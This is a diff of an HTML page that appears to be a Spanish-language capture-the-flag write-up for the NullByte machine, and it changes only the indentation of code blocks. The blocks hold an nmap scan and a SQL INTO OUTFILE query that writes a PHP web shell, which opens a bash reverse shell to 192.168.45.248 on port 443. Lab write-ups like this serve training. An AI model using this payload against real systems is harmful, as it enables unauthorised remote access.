@@ -37,7 +37,7 @@
         <p><i class="fa fa-clock-o"></i> Posted on February 28, 2024</p>
         <p>&#10095; Hacemos un escaneo de puertos con nmap.</p>
         <pre><code>
-nmap -p- --open -n --min-rate 5000 -sVC -Pn -vvv ipVcictima -oN targeted
+    nmap -p- --open -n --min-rate 5000 -sVC -Pn -vvv ipVcictima -oN targeted
         </code></pre>
         <img src="./imagenes/NullByte/nmap.png" alt="Description of your first image">
         <p>&#10095; Entramos al puerto 80 y vemos esta imagen, le pasamos exiftool y encontramos lo que parece ser una password.</p>
@@ -87,7 +87,7 @@ nmap -p- --open -n --min-rate 5000 -sVC -Pn -vvv ipVcictima -oN targeted
         <p>&#10095; Escribimos la siguiente query en el campo SQL para que nos cree un archivo <code>shell.php</code> con una revershell 
         en el directorio <code>uploads</code> y recibimos una shell como <code>www-data</code>.</p>
         <pre><code>
-SELECT "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/192.168.45.248/443 0>&1\"');" into outfile "/var/www/html/uploads/shell.php"
+    SELECT "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/192.168.45.248/443 0>&1\"');" into outfile "/var/www/html/uploads/shell.php"
         </code></pre>
         <img src="./imagenes/NullByte/query.png" alt="Description of your second image">
         <p>&#10095; Nos ponemos en escucha con <code>netcat</code> y al entrar a nuestro archivo <code>shell.php</code> recibimos
